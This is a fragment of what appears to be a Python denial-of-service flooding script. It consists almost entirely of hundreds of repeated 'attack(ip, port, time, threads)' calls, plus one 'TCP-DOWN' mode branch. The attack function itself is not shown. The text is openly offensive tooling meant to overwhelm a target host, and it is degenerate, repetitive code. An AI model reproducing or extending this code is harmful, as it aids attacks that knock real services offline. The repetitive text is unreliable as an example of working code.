        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
     if choice == 'TCP-DOWN':
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
